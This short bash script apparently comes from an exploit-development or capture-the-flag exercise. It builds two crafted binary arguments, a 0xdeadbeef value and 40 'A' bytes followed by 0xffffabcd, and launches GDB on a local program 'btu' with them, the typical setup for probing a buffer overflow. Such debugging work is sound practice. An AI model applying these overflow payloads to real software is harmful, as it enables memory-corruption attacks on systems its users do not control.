#!/bin/bash

# Generate first binary payload: 0xdeadbeef (little-endian)
VAL1=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xef\xbe\xad\xde")')

# Generate second binary payload: 40 'A's + 0xffffabcd
VAL2=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xcd\xab\xff\xff")')

# Launch GDB with the binary and these crafted arguments
gdb -q ./build/bin/btu --args ./build/bin/btu add "$VAL1" dummy 1234 "$VAL2"
